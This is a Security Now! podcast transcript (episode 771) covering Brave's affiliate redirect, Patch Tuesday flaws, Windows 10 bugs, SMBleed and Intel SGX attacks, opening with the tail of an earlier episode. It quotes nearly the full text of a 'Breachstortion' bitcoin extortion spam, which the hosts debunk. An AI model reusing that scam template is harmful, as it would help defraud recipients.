He also has 64Kb audio.  That's all at GRC.com, along with all sorts of other freebies like SpinRite.  No, that's not free.  ShieldsUP!, that is, now with built-in testing for Universal Plug and Play flaws.  You can also get all sorts of other stuff there.  It's fun.  It's a rabbit hole you go into and you never come out.  All sorts of fun things to read.



You can also catch this show on demand on our website, TWiT.tv/sn.  It's on YouTube.  You can ask your voice assistant to play the Security Now! podcast.  They'll play the most recent episode.  If you want to watch live, we do it Tuesdays round about 1:30 in the afternoon.  That's 1:30 Pacific, 4:30 Eastern, 20:30 UTC.  The live streams - and they were little glitchy today, I apologize.  People asked us to rewind the show, but we can't do that.  The live shows are at TWiT.tv/live.  But the beauty part is we've got it on demand, so you can see the whole thing you missed in just a matter of a few hours.  If you subscribe, you'll get it automatically.  That's probably the best thing to do.  Find your favorite podcast application.



Steve, stay well, stay healthy, and stay on top of things for us because we'll need you next week on Security Now!.



STEVE:  I'm ready.  See you next week, buddy.  Bye.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.










GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#771

DATE:		June 16, 2020

TITLE:		Lamphone

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-771.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we address an accident that the Brave browser guys regret.  We take a look at last week's Patch Tuesday and its several ramifications and consequences.  We note a few odd new and unwelcome behaviors from this year's 2004 Win10 feature update and dip into yet another side-channel attack on Intel chips.  But we also note that a long-awaited powerful antimalware technology is also about to ship from Intel.  We look at the latest new SMB vulnerability named SMBleed, and conclude with an examination of the latest and more-practical-than-most techniques for covertly eavesdropping on a remote location - via a hanging light bulb.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Coming up we'll do trigonometry in assembly language.  It's actually pretty cool, believe it or not.  We'll also talk a little bit about the 129 vulnerabilities Microsoft patched on last Tuesday, and the light bulb that listens.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 771, recorded Tuesday, June 16th, 2020:  Lamphone.



It's time for Security Now!, the show where we cover your security, your privacy, your safety on the interwebs with our safety officer, not wearing a red shirt today, that's good news, Mr. Steve Gibson.



STEVE GIBSON:  No, those red shirt guys, they beam down to the planet, you know they don't have much longer.



LEO:  That's it.



STEVE:  That's it.



LEO:  You don't want to join that landing party.  No way.  No way.



STEVE:  That's right.  That's right. 



LEO:  So what's up?



STEVE:  So we've got, for Episode 771, Lamphone, L-A-M-P-H-O-N-E.  Our friends at the Ben-Gurion University of the Negev are at it again.  They decided to find out whether a light bulb hanging down from the ceiling picks up enough vibration from the conversations in the room for them to listen in at a distance.



LEO:  And I'm guessing, because we're talking about it...



STEVE:  Yeah.



LEO:  ...that maybe it can.



STEVE:  It worked.



LEO:  Wow.



STEVE:  So but of course, well, and actually originally that was not going to be the main story.  There were a whole bunch of new vulnerabilities that have appeared.  And I thought, huh.  Let's just do newly vulnerable.  But the Lamphone, you know, these guys always wrestle this stuff right down to the ground.  It's one thing to say, oh, I wonder if a light bulb vibrates.  But they've got the theta and phi spherical coordinates mapped out.  And like they just - anyway, we're going to have a lot of fun with that.



But we also have an accident for which the CEO of the Brave browser apologizes with regret.  We're going to take a look at last week's Patch Tuesday and its myriad ramifications and unintended consequences.  Oh, boy.  And of course they broke another record, that is, Microsoft did.  We also note a few odd new and unwelcome behaviors from this year's 2004 Win10 feature update.  Anyone care to print after that?



We're going to dip into yet another side channel attack on Intel chips, but also note the final arrival of a long-awaited powerful antimalware technology which Intel is about to start shipping.  We're going to look at yet another new SMB vulnerability named SMBleed.  And then we will conclude with an examination of this latest, what happens if you look closely at a light bulb research.  So, yeah, I think we're all going to have fun.  And a really interesting Picture of the Week for our more savvy, technically inclined listeners.



LEO:  For the geeks amongst you.



STEVE:  Yes.



LEO:  I would guess everybody who listens to this show is at least a little bit geeky.



STEVE:  I think so.



LEO:  I'm thinking.  Steve, I can't wait for you to explain what I'm seeing here, this Picture of the Week.



STEVE:  So you're talking about our Picture of the Week.  The caption says:  "In 1969 Apollo 11, the spaceflight that first landed humans on the Moon, used just 30 simple instructions to calculate the transcendental functions like sine and cosine essential for navigation."  This made the rounds of social media a couple weeks ago, and I just grabbed it because I thought it was so clever.



Transcendental functions are historically very difficult and time consuming to calculate.  I mean, even on modern machines.  Of course now we've got the math coprocessor.  And one way to just sort of sidestep the whole problem would have been just to use a big table.  I mean, once upon a time, remember, what was it, the CRC that we had back in our college days.



LEO:  Oh, yeah.  You wouldn't calculate it.  You'd do a lookup.



STEVE:  You would often just look up a sine or cosine in a book that had the tables printed because they were just - I was like, that's the way you found out the value.



LEO:  That's how early Lempel-Ziv compression worked.  It was just table-based because a lookup's table so fast, you know.  You're not doing the work.



STEVE:  Well, yes.  It's fast.  But the problem is it's also big.  And what we didn't have in 1969 for the Apollo 11 was memory.  There just, you know, that still was rare.  So what some brilliant mathematician, and I forgot her name, but it was a woman who was in charge of this aspect of the Apollo 11...



LEO:  Was it Margaret Hamilton?



STEVE:  That sounds right.



LEO:  She wrote a lot of the Apollo 11 code, yeah.



STEVE:  That sounds right.  I think it was Margaret.  She realized that you could, for the region, for the important region of a sine - and of course a sine and a cosign are just 90 degrees skewed, so if you have one, you automatically get the other.  For this important range it was possible to use a relatively simple polynomial that tracks it through that range.



And for anyone who's interested, this is in the first page of today's show notes.  It shows the actual function of sine as it sines itself along on a blue curve.  And then this polynomial approximation, which comes out of nowhere, and then just in the nick of time settles right onto the sine wave and follows it virtually perfectly.  And when I say "virtually," I mean, you know, we did get to the Moon.  We didn't overshoot or undershoot.



LEO:  Yeah.



STEVE:  You know?  We landed.  So it's just a beautiful piece of work.  And then this also shows the polynomial which is, while it's not simple, it turns out it decomposes into a number of divisions and multiplications and some factorials which end up being pretty simple.  So, and that ends up being expressible in just 30 instructions.  So just a very nice piece of work.



LEO:  So cool.  So cool.



STEVE:  Really, really nice.



LEO:  Yeah, just really neat.  Wow.



STEVE:  Okay.  So not so neat, although kind of a tempest in a teapot...



LEO:  Yeah, I think not as bad as people made it out to be, yeah.



STEVE:  Yeah.  Cryptonator 1337 - and of course 1337, as we know, is LEET sort of upside down, he or she was the first to note this behavior of the Brave browser, which they found objectionable, tweeting:  "So when you are using the @brave browser and type in 'binance.us,' you end up getting redirected to 'binance.us/en?ref=35089877.'  I see what you did there, mates."



So okay.  So Binance, as in kind of a clever take on "finance," is a cryptocurrency exchange with whom Brave has a fiduciary relationship.  They have Binance on their widgets on their new tab page, hoping that people will click on it, and that they'll get a little bit of referral money in order to finance the Brave browser project.



So Brendan Eich, the Brave CEO and cofounder, whose Twitter bio also notes that he cofounded Mozilla and Firefox and created JavaScript, so he's been around, he tweeted:  "We made a mistake.  We're correcting."  He said:  "Brave default autocompletes verbatim in address bar to add an affiliate code."  He says:  "We are a Binance affiliate.  We refer users via the opt-in trading widget on the new tab page.  But autocomplete should not add any code."



Okay.  So then he goes on for another six tweets explaining himself and so forth.  To which someone replied:  "It's not a mistake.  You did it on purpose."  Which Brendan replied:  "I think you used 'mistake' where you meant 'accident.'"  He said:  "I never said it was accidental."  He says:  "We were treating it like a search query, which all big browsers do, tag with an affiliate identifier to get paid by the search provider."  He said:  "But a valid domain name is not a search query.  Fixing."



So anyway, essentially they decided, I mean, Brendan agreed that, if you enter something into the URL of a browser, you don't expect it to get changed with an affiliate tag added to it.  So it no longer does.  It wasn't nefarious.  It wouldn't have altered the browser's cookie exchange in any way.  So it wouldn't have had any effect on user tracking.  Really the browser...



LEO:  And it didn't say any information about the user to Binance, either, any more than they would normally get.



STEVE:  Correct.



LEO:  Didn't do that.



STEVE:  Correct.



LEO:  It just said, hey, we sent you.  We'd like some money.  Like a little, give me some bitcoin.



STEVE:  Yeah, exactly.  And when you think about it, the browser's user-agent header could have identified the visitor coming into Binance as a Brave-sourced user.  But I presume that Binance is only equipped to accept affiliate tags through the search query or through the query URL that arrives to them.  So that's the way Brave did it.  Brave is now a full Chromium-based implementation, which makes sense, since maintaining a secure browser, no matter how good you are, and keeping it state of the art is an impossible burden these days.



We would prefer, yes, not to have a monoculture in browsers.  But a modern web browser has become like an operating system.  It's just no longer something that can be built up from scratch.  And if someone said, yeah, but I can do it, the proper response would be, why bother?  We already have browsers, and they're fine.  So this is just not a wheel that you can reinvent.  But anyway, I sort of saw that in passing, and I thought, okay, well...



LEO:  Yeah, there was a lot made of it.  I feel like all browsers - look, Firefox doesn't do that, but Firefox lives - because these are free; right?  It lives on the money it gets from Google referrals.  And I just think that that's - I think Brendan, who knew that, having founded Mozilla, just kind of didn't think about it.  So when he says "mistake," I don't think it was like a programming error.  It was a mistake in judgment.  And I think that that's fair.



STEVE:  Right.  And that's what he meant.  It wasn't an accident.  It didn't happen by mistake or accidentally.  They just thought, hey, that's one other way that somebody might go to Binance, so let's jump on its coattails and get some credit for that, too.  And really, you know, they didn't have to show it.  I mean, this got observed, but they could have done this surreptitiously, if they wanted to be sneaky, and they didn't bother to.  So it's just like, okay, yeah, you're right, that's maybe pushing affiliate tagging a bit too far.



LEO:  Yeah, I think they did the right thing.  They took it out.  And I do believe there was a switch. You could turn it off, as well, in the settings.



STEVE:  Yes, there is.  Somewhere in the config options you can disable it.  But again, we know that most people are not going to do that.



So Microsoft is, if nothing else, consistent.  They are continuing their record-breaking streak, or as Sophos put it:  "Whoosh.  You hear that?  It's the sound of Microsoft's security fire hose spraying out a river of CVE fixes."



LEO:  Oh, man.



STEVE:  "That's right," they wrote, "Patch Tuesday was last week," the software giant's largest yet, releasing, yes, 129 fixes for CVEs.  In other words, once again Microsoft has broken, well, set and broken its all-time record for the most patches released in one month.  Do you remember, Leo, we used to talk about 11.



LEO:  Yeah, yeah.



STEVE:  We were like, wow, there were 11.  Okay.



LEO:  Is this good or bad?  I mean, they are getting found and fixed.



STEVE:  Yeah, but they're also, as we'll see shortly, they're also creating more problems than they're fixing.  I mean, they really are.



LEO:  Yeah.  If they're introducing them, it's bad.



STEVE:  Yeah, really, they really are breaking things.  So, okay.  So just quickly, most of the 129 are rated just "important."  Eleven of those 129 CVEs are CRITICAL, in all caps.  And they're remote code execution vulnerabilities.  It's pretty much the case now that if it's not remote code execution, it's like a yawn.  Although, you know, privilege elevation can be, as we've seen, a problem, too.  But anyway.  So these are in Windows 10.  They're all CVE-2020 somethings.



And so here we have 1286, a Windows shell remote code execution triggered by improper file path validation.  There that is again.  We have 1299, a remote code execution bug, again, that an attacker could exploit using a malicious .lnk, that is, a link file.  And note that either we still haven't got link files working right, or we keep breaking them, since Windows has been having security problems with link files from Windows 95.  And in this case, Microsoft warns us that if a malicious link file was placed onto a removable drive or a network share, clicking on the link file would run the attacker's malicious remote execution code contained in the file, or remotely provided, that they consider an RCE bug.



Then we have 1281, a vulnerability in Windows Object Linking and Embedded, OLE code, stemming from poor input validation.  And it's exploitable via a malicious website, a file, or an email message.  1248, a memory object handling bug in GDI, the Windows Graphics Device Interface, which is deliverable via website, an instant message, or a document file.  Those all affected Win10, of course, since Windows 7 is no longer being maintained, and many of those also affected the latest 2004 build of Windows 10 since, of course, most of the code never changes.



Not to be forgotten, IE had its own batch of critical vulnerability bungles.  Both IE9 and 11 were susceptible to a remote code execution via bug, or actually three bugs - 1213, 1216, and 1260 - all memory handling errors affecting Visual Basic Script, VBScript.  The original web browser - which I guess still isn't quite history yet, although as we talked about last week they're now working to replace it with Edge and then irrevocably replace it since you can't get rid of it once it lands.



The original Edge browser had a critical vulnerability, 1073, a memory-handling bug in its ChakraCore JavaScript engine.  And then there's 1219, which affects both IE and Edge HTML, with more memory-handling issues.  And finally, 1181, a bug in the SharePoint Server.  It can be exploited by unsafe ASP.NET controls that don't filter properly.  And apparently attackers who are able to upload a malicious page to the server, it's not clear how they would do that, perhaps through remote website authoring, could achieve pwnage.  As a consequence, admins of SharePoint Enterprise Server 2016, Foundation 2010 SP2 and 2013 SP1, or SharePoint Server 2019 should all patch now, or should have.



And what's interesting is that those numbers are so low.  This suggests that these were reported to Microsoft early in 2020.  I mean, we're mid-June now, and I don't know where the CVEs are, but they're way above 1200.  And so Microsoft has taken a while to actually get these out to the world.  Oh, there's also 1300, a longstanding bug in Windows' handling of cabinet files.  It affects most versions of Windows, including 7 through 2004, you know, Windows 10, and Windows Server.  And believe it or not, those are just the 11 critical bugs.  If I were to attempt to detail the other 118 important flaws, this entire podcast would have to be retitled "What Happened Last Tuesday."  So I'm going to spare us that since we have plenty more to talk about.  But in the meantime, Microsoft...



LEO:  I do think the key here is most of those are old.  So to my mind, if Microsoft's introducing new flaws, problematic.  Right?  But if they're fixing - the rate might be going up because they're doing a better job of finding and fixing old flaws, that's a good thing.



STEVE:  That would be a good thing.  Which, thank you, Leo, for the segue, because we also have...



LEO:  This is a new one.



STEVE:  ...Microsoft's disclosure of an oddball Win10 delight.



LEO:  Weird.  Yeah, unique to Windows 10.



STEVE:  Titled, I'm not kidding you, "USB printer port missing after disconnecting printer while Windows 10" - and this is versions 1903 or later - "is shut down."  And it started - okay.  And they stated this applies to Windows 10 1903, all editions; Windows 10 1909, all editions; and Windows 10, yes, 2004, all editions.



So Microsoft explains:  "If you connect a USB printer to Windows 10 version 1903 or later, then shut down Windows and disconnect or shut off the printer.  When you next start Windows, the USB printer port will not be available in the list of printer ports.  Windows will not be able to complete any task that requires that port."  For example, printing.



So they said, under "Resolution:  You can avoid the issue by connecting a powered-on USB printer before starting Windows."  Because of course this is the 21st Century.  "Microsoft has confirmed," they wrote, "that this is a problem in the Microsoft products that are listed in the 'Applies to' section."  And that was all Windows from 1903 on.  "We are working to fix the issue in a future version of the operating system."  What?



Okay.  So according to reporting of this in the tech press, if you need to print something to your previously USB-connected printer, and you didn't have it turned on before you started Windows, no problem.  Just shut down your computer, turn the printer on, and wait for it to finish initializing and settle down.  Then you can fire up Windows, and the printer port would reappear, and you'll be able to print.  With Windows.  Because, you know, this is a state-of-the-art modern operating system.



And believe it or not, in a related but separate matter, last week's Patch Tuesday broke all printing, even to PDFs, for many users.  Windows 10 users are reporting that they are unable to print to printers from several vendors after installing last week's cumulative Windows 10 patches for 1903, 1909, and 2004 OSes.  Two specific patches causing troubles have been determined to be the cumulative updates, and these are KB4560960 or KB4557957.  Although Microsoft hasn't yet gone official, a Microsoft Answers Independent Community Advisor has stated that Microsoft engineers are "already aware of this issue and working a patch to be deployable in the next update."  So no printing for a month.



After updating their machines last Tuesday, users began flooding both Microsoft Answers forums and Reddit with reports of printing issues affecting various models of HP, Canon, Panasonic, Brother, and Ricoh devices.  Typical postings included, for example, here's:  "Unable to print after installing update KB4560960 and/or KB4561608.  Uninstalling updates fixes the problem.  This is happening to every Windows 10 computer in our organization as updates install."



Another one says, right after installing KB4560960 on multiple systems, users started reporting:  "Windows cannot print due to a problem with the current printer setup," errors that went away after uninstalling the update.  Someone else wrote:  "Found this problem today where all clients at a customer site had the same problem.  They have Ricoh, but a few other brands, too.  Even the virtual PDF printers do not work anymore.  Explorer.exe crashes completely when doing a test print."



A network tech posted:  "HPs seem to be hit or miss with this issue.  Ricoh, Canon, Brother, KM, Kyocera all seem to be experiencing problems.  As everyone else is saying, backing out update KB4560960 and postponing updates seems to be our only salvation at this point."  And then somebody else:  "Hopefully Microsoft will produce a patch for this quickly.  Call volume is picking up with everyone returning to work.  This is going to make things awfully hectic."  So, yes, new breakages.



Affected users have found that the printer's native driver can be replaced with PCL6 drivers, which reportedly work, or by uninstalling last week's cumulative updates to restore printing, and of course to also restore those 11 critical remote code execution bugs.  You'll be fine.  It's been determined that attempting to uninstall and reinstall the printer, or updating its drivers, does not help.  PCL6 printer drivers do work, either vendor-specific PCL6 drivers or the universal Windows 10 PCL6 drivers for Canon, HP, Ricoh, Kyocera, and Brother.  So, oh, brother.



LEO:  Really amazing.



STEVE:  And Leo...



LEO:  So that's an example of you don't want to see that.  You don't want to see them introducing - especially stupid bugs.  What do you think that's being caused by?



STEVE:  I have no idea.  I mean, really.



LEO:  It's so weird.



STEVE:  Like what could it be?  And that's not all.



LEO:  There's more.



STEVE:  Those running Windows 10 - yes, and wait, there's more.  Those running Windows 10 who have moved this time only to 2004, who have systems based on SSDs, the 2004 feature update has broken Windows' awareness that it has ever previously defragmented the system drive.  As a result, rather than only defragging occasionally - like once a month by design, which is known to improve the performance of Windows "volume shadow copy on write" system - now, if you have 2004, Windows 10 is defragging over and over and over, every time the system is started.



Now, it's not a huge problem since SSDs should have strong write endurance.  But unfortunately it's not something you want to tax, and it's not what anyone wants.  Microsoft has acknowledged the problem, but has not indicated when it will be resolved.  The release notes for the insider preview build 19551 state:  "Thank you for reporting that the Optimize Drives Control Panel was incorrectly showing that optimization hadn't run on some devices.  We've fixed it in this build."



Now, that makes it unclear whether it doesn't show it or that it isn't acknowledging it.  The screenshots I saw showed it running, suggesting that it is actually, if you open it up after you restart Windows, you'll see like, oh, yeah, we're redefragging your SSD, which we did for you yesterday, when you last turned Windows on, because we forgot we did that.  So anyway, insider preview build 19551 fixes that.  Unclear when other 2004 users are going to get it.



And in another oddity, Windows 10 2004 is for some reason also attempting to use the TRIM command against non-SSD drives.  That of course fails and logs an error into the Windows error log because spinning drives don't support the TRIM command.  Windows is not supposed to be trying to get them to TRIM themselves.  Our long-time listeners will recall that SSDs have a TRIM command to allow the operating system to inform the drive of those regions that are not in use by the OS.



Normally drives, you know, traditional hard drives treat all sectors alike, and only the OS has any awareness of which regions are in use by its file system and which are free.  Hard drives write data by simply overwriting what was there before.  They just plow right over it.  But SSDs are only able to set bits that have been previously reset by an erase cycle.  And those are NAND-based SSDs.  And erase cycles only erase large blocks of the SSD all at once.  This means that to write a small region of a larger block, the previous contents of that larger block must first be read and held in a cache while the underlying physical SSD block is all reset.  Then that cache data must be rewritten into the block.



But if the SSD has an awareness, thanks to the TRIM command, having been previously used, of which sectors are not needed, it can leave them reset, in the reset state, rather than rewriting them needlessly with junk data.  And those that are reset and have not been written to can later be directly written to because they've been left reset without needing that whole pre-erase cycle.  So this TRIM command is a win.  You definitely want it on SSDs.  And of course our modern OSes all have that now.  But it makes no sense for hard drives.  So again, Windows 10 2004 introduced another new bug which is causing it to issue superfluous TRIM commands to spinning hard drives.  Doesn't hurt anything, but it just sort of says, you know, Microsoft...



Oh, and there were also many reports that programs would no longer run at all after last Tuesday's updates.  But I followed that down.  It turned out to be a problem caused by an interaction, yes, with a recent update for Avast or AVG antimalware.  There is, in the registry, there's the ability to support a debugger, that is, essentially it's a hook which allows, when you tell Windows to run one program, it actually - it goes to the registry and checks this little region.  And it's possible for a user to have a debugger run instead, and then the debugger runs that other program, essentially a way of getting a debugger into programs in order to debug its startup.



And it makes me a little queasy that this is what Avast and AVG are doing, that is, I mean, they're deeply hooking the system such that, when they broke that feature, all the commands that they'd been hooking in this way, all the executables, stopped working.  So they produced an update quickly, and this problem got fixed.  Somehow it interacted with Tuesday's update.  And we've seen instances before now where antiviral software, which is getting its hooks deeply into our OSes, are beginning to collide with what it is that Windows is doing.



So my take is, much as Win10 2004 has some interesting useful new features, it really does feel as though perhaps holding off a bit and waiting for things to settle down might be prudent.  I have an Intel NUC running Windows 10, and whatever it is that is new about 2004, Microsoft is saying, no, we're not ready yet on your hardware.  And I'm just saying, good.  I'm not ready yet, either.



LEO:  Yeah.  It's holding off installing it on places where they think there might be an issue.  So who knows.



STEVE:  Yeah.  And in fact, Leo, that would be everywhere.



LEO:  Everywhere, yeah, all of them.



STEVE:  Yeah.



LEO:  Yeah.



STEVE:  If you have a printer, don't install 2004.



LEO:  Don't.  Geez, Louise.  Oy oy oy.



STEVE:  If your system has a hard drive or SSD, no, don't install 2004.



LEO:  Yeah, no, unh-unh.  Yeah, bad idea.



STEVE:  Floppy-based Windows, Win10 on floppies, not a problem.  We have that nailed.



LEO:  Where can I get Windows 10 on floppies?  Oh, man.  



STEVE:  So another SMB problem.  We've got a new information leakage vulnerability which was introduced in Windows 10 1903, and it's present in all releases since.  With Windows 10 1903, Microsoft's very troubled SMB, you know, Server Message Blocks, a.k.a. file and printer sharing, has been around also forever.  But they can't leave it alone because it was updated, or upgraded, to support optional compression, which is present in SMB v3.1.1.



And the trouble is this allows a new class of information probing attacks to succeed, thanks to the foothold this provides an unauthenticated attacker.  It's loosely related to the SMB Ghost vulnerability that so alarmed Microsoft earlier this year when they warned everyone that it could be turned into a wormable exploit.  And as we know, that never happened, but it was successfully used against selected targets.



Microsoft Security Advisory published last week stated that "an attacker who successfully exploited the vulnerability could obtain information to further compromise the user's system."  And they also said:  "To exploit the vulnerability against a server, an unauthenticated attacker could send a specially crafted packet to a targeted SMBv3 server."  In other words, an open file and printer sharing port.  "To exploit the vulnerability against a client," they said, "an unauthenticated attacker would need to configure a malicious SMBv3 server and convince a user to connect to it."  That seems much more far-fetched to me.



So the big threat is against servers, as usual.  So the problem will mostly affect those devices, Windows 10 servers; and the core servers are affected, as well, since they proudly support SMBv3.1.1.  And at this point anybody who has an SMB protocol service open to the public has few excuses when something uses that port to crawl into their network.  It's not only an open port.  It's an open invitation if it's Server Message Blocks, SMB.



The ZecOps guys who are the ones who disclosed and detailed their findings have been taking some heat for also simultaneously releasing a pair of proof-of-concept demos.  One was an uninitialized kernel memory read proof of concept that creates a local file containing the target computer's kernel memory.  Whoops.  Like we know what's in the kernel:  all of the keys, all of the cryptographic keys which are currently in use.  They also posted a pre-Auth remote code execution proof of concept combining SMBleed with SMBGhost that opens a reverse shell with full system access.  What could possibly go wrong?



So when asked why they didn't wait for Windows users to first patch their systems, because this all just happened, and chose to publish their proof of concepts when SMBleed was disclosed, the ZecOps guys said that the security vulnerability was not critical on its own, that is, all by itself.  They argued that "After the patch was made available, the vulnerability was so easy to spot and reproduce," and "Only when combined in combination with another primitive, such as SMBGhost, would SMBleed be critical."  And since SMBGhost was patched three months ago, they felt that people should be safe.



So the takeaway for our listeners, if your company still has SMB exposed to the public, really, really invest in a VPN solution having multifactor authentication.  Since this attack works against unauthenticated attackers, not even multifactor SMB authentication would protect your servers.  And as I said, changing to some other port than 443 - or, wait, no, 445 - is no longer enough.  You just can't move it somewhere because, for example, Shodan now looks at all the ports and figures out what service is running there.  So, yeah, you're easy to find.  Just changing to an obscure port, no.  You may think that's tricky.  No, not any longer.



Now, I'm sure that no one listening to this podcast would fall for this.  But just for the record, this fraudulent website extortion scam has been in the tech press news recently because those behind it are, if nothing else, persistent.  And because the email was apparently written by someone with at least somewhat passable English, which is a little bit unusual for some of this spam email, it's come to people's attention.



The email reads:  "Subject:  Your Site Has Been Hacked."  And, you know, as a person who has a site, I thought, okay, what?  It turns out that people with no websites get this, too.  So the guys aren't even being that clever.  But the subject of the email comes in, "Your Site Has Been Hacked."  It's like, oh, okay.  Then in all caps:  "PLEASE FORWARD THIS EMAIL TO SOMEONE IN YOUR COMPANY WHO IS ALLOWED TO MAKE IMPORTANT DECISIONS."  So I guess that's meant to be, yeah, we know you may not actually be in charge of the site, but your company's site has been hacked.  So they say:  "We have hacked your website," and then they say "URL redacted," which is, okay, a little [crosstalk].



LEO:  Because we don't know it.



STEVE:  We don't actually, yeah, know the URL of your site.



LEO:  Just, you know, fill it in yourself.



STEVE:  That's right.  You know what your site is; right?  Yeah.  We're not going to bother telling you.  And, they say, "...and extracted your databases."



LEO:  Ooh.



STEVE:  And they say:  "How did this happen?  Our team has found a vulnerability within your site that we were able to exploit.  After finding the vulnerability, we were able to get your database credentials and extract your entire database and move the information to an offshore server."  Of course we're not sure which shore that is, but it's offshore.



"What does this mean?" they say.  "We will systematically go through a series of steps of totally damaging your reputation.  First your database will be leaked or sold to the highest bidder, which they will use with whatever their intentions are.  Next, if there are emails found, they will be emailed that their information has been has been sold or leaked, and your site" - and again, brackets, website URL - "was at fault, thusly damaging your reputation and having angry customers/associates with whatever angry customers/associates do."



LEO:  What the what?



STEVE:  "Lastly, any links that you have indexed in the search engines will be de-indexed based off of black hat techniques that we used in the past to de-index our targets."



LEO:  Oh, yeah, those black hat techniques, whoa, boy.



STEVE:  They've got experience.  Yeah.  "How do you stop this?"



LEO:  I don't know.



STEVE:  "We are willing to refrain from destroying your site's reputation for a small fee."



LEO:  Oh, that's fair.



STEVE:  "The current fee is," and then "[ransom amount] USD in bitcoins."  And they say:  "If you decide not to pay, we will start the attack at the indicated date and uphold it until you do.  There's no countermeasure to this.  You will only end up wasting more money trying to find a solution.  We will completely destroy your reputation amongst Google and your customers."



LEO:  Oh, boy.



STEVE:  Yeah.  So the ransom demands generally range between 1,500 and $3,000 equivalent in bitcoin.  And of course this is all nonsense.  However, I have received this email several times myself at the email address registered actually for my one remaining domain at Network Solutions.  It's just not worth moving it.  Unlike Hover, where I have moved everything that's movable, Network Solutions does not offer registered email blinding along with their service.  And I refuse to pay Network Solutions any extra because it's like every year $5 or something.  It's like, no.  And the domains that are still there are just - they're prepaid, long-duration domains I bought, you know, they're just sticky.



But you know, Leo, security experts are nothing if not curious.  And since what's been called "Breachstortion" - this campaign has been named that by the tech press, the "Breachstortion" campaign.



LEO:  That's not a good word.



STEVE:  No.  It lists the extortionist's pay-to bitcoin wallet addresses.  And since it's possible to monitor the bitcoin blockchain for payments made to wallets, the web security firm WebARX decided to see how successful this campaign might be.  By scouring social media postings for references made to this campaign, and there were many, WebARX identified the multiple bitcoin wallets being used to collect whatever ransom payments might be made.



In their coverage, WebARX wrote:  "Unfortunately, looking at the different bitcoin wallets linked to these attacks, there have been at least five people who have fallen to the scam and paid ransom.  One of the wallets linked to the attack has received close to $2,000 worth of payments in bitcoin.  Another wallet used in this scam which has not yet received payments has been reported for abuse 81 times."  So whoever is paying these are apparently not the brightest bulbs in the box since the threat and payment demand contains no email, no website contact details, is apparently just a blind spam.  Which means that the scammers tell the recipient not to bother replying to the email at all.  And there's no website where they're able to trace the payment to see whether they've received the money.



They explain to their intended victim that "Bitcoin is anonymous, and no one will find out that you have complied."  So presumably that's meant to put the target's mind at rest by convincing them that the act of payment will not itself draw attention to the of-course-it's-fake breach, even though it means that you're relying entirely on the crooks then to keep track of which payments were made to protect which website's data.  Which of course they're not.  Unless they're sending, like, separate bitcoin addresses to each email address, which they're not.  Or tracking them by using custom per-demand amounts, which seems highly unlikely.  In other words, they have no idea if they receive money, obviously...



LEO:  Thanks for the donation.



STEVE:  ...who they got it from.  Yeah, it's just a donation to their spamming campaign.  So this is just a blind spam gamble, hoping that it will pay off.  But as one of P.T. Barnum's more well-known quotes observed:  "There's a sucker born every minute."  On the other hand, remember that SophosLabs similarly reported on the apparent success of those porn-scamming solicitations.  You know, the one that claims to have activated your webcam and to have recorded what you were doing while you were watching online porn.



It's a bit unnerving the first time one of those arrives.  I've had a few friends who have received that spam and asked me whether it's possible.  Apparently they were a little worried.  Sophos did some similar digging into the blockchain and discovered that that porn-spamming campaign was generating on the order of $100,000 a month for those guys.



LEO:  Yeah.  I'm not surprised, yeah.



STEVE:  So, yeah.  Enough people, like, say, oh...



LEO:  Why take a chance?  Maybe it really did happen.  I'm going to give them money.



STEVE:  Maybe it did happen because, you know...



LEO:  I'll tell you, if they made it easier to pay, I bet they'd make more money.



STEVE:  I know.



LEO:  It's complicated.



STEVE:  I bet you're absolutely right.  The fact that it's bitcoin is a huge hurdle. 



LEO:  In fact, the email, because I've got it many, many times...



STEVE:  Oh, yeah, yeah.



LEO:  ...goes through a bunch of steps that you have to - so if you want to know more - we talked about it a while ago.  If you want to know more about bitcoin, read this article.  Now, here's how you create a bitcoin.  Blah blah blah blah blah.  It's too much trouble.  Most people are just going to give up.



STEVE:  Yeah, just watch some porn instead.



LEO:  Go watch some porn.



STEVE:  So what is real is that unfortunately there are some authentic database ransom attacks.  Insecure SQL, you know, SQL servers exist for online merchants, and there have been multiple accounts of their databases being copied and ransom notes left behind demanding payment or else.  And being authentic, those attacks have been far more successful in collecting ransom.  Researchers have tracked a total of 5.8 bitcoin, currently worth around $54,000 based on current bitcoin valuation, having been sent to the attacker's address by over a hundred victims into just two attacker wallets.



In the past, similar database ransom attacks have targeted MongoDB and also MySQL servers.  So again, please, please, please never leave SQL servers exposed to the public Internet.  Not even on, as with SMB, nonstandard ports.  As I have said before, changing a port is no longer a sufficient protection.  You know, if you have to do it, then use IP address filtering.  That is, if someone remote has to connect to your system, they will almost certainly have a relatively static IP.  So put up an IP filter and only allow incoming packets from that IP address.  It's not perfect, but it's really, really strong protection because only someone at that IP is able to see that there is a port open.  Better to use a VPN, obviously.  But if you can't, certainly you ought to have a firewall at your boundary.  So restrict access to anybody not at that IP.



And we have another side-channel attack on Intel chips.  As we know all too well, the past two years have been a watershed period for security researchers poking into the seemingly unlimited supply of new vulnerabilities which have arisen as a consequence of our processor architectures, predominantly Intel's, because they cleverly attempted to squeeze every last microcycle of possible computational power from our chips.  For that we thank them.



We don't thank them for the fact that, unfortunately, as seemingly benign as, for example, a cache is - which is used to decouple the demands of the fast processor from the comparatively lethargic reluctance of DRAM to give up its data - even a cache can, as we've learned, have its contents probed by other processes sharing the same hardware.  And in today's cloud world, where you do have many different users sharing the same hardware, now you've got a problem.  So throughout 2018, as we know, Intel's engineers learned to just what degree their clever engineering, meant to optimize the chip's performance, could be used by malicious code to exfiltrate data across virtually every security boundary that they had deliberately erected.  They were all porous.



So today no one would be surprised to learn that yet another fault has been discovered and leveraged by researchers to penetrate Intel's SGX.  That's their Software Guard Extension, which is their version of a Secure Enclave.  Unfortunately, not as secure as they were promising.  Last week two separate academic teams discovered two new distinctive exploits that do exactly that.  They pierce Intel's Software Guard Extensions, which is designed to be by far the most secure region that Intel processors create.



